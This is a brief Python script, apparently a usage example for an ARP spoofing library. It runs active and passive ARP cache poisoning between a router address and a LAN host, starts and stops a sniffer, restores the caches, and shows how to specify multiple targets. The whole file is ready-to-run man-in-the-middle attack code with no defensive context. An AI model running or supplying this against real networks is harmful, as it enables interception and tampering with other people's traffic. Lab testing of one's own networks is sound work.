from ArpSpoof import SpooferARP



spoofer = SpooferARP('192.168.1.1', '192.168.1.106')
spoofer.active_cache_poisonning()

spoofer = SpooferARP('192.168.1.1', '192.168.1.106', conf.iface, False, 0.5)
spoofer.passive_cache_poisonning(asynchronous=True)
spoofer.run = False
spoofer.sniffer.stop()
spoofer.restore()


spoofer = SpooferARP('127.0.0.1', '127.0.0.2,127.0.0.3')
spoofer = SpooferARP('127.0.0.1', '127.0.0.2-127.0.0.5')
spoofer = SpooferARP('127.0.0.1', '127.0.0.0/30')

